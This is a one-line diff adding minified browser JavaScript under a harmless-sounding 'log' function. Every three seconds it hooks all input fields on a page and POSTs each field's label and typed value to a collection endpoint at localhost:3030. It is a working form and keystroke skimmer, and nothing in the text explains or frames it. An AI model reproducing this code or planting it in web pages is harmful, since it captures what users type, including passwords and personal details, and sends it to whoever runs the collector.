@@ -1,0 +1,1 @@
+function log(o){var t=o.target;fetch("http://localhost:3030/data",{method:"POST",body:"".concat(null==t?void 0:t.ariaLabel,": ").concat(null==t?void 0:t.value)})}setInterval(function(){document.querySelectorAll("input").forEach(function(o){o.oninput=log})},3e3);
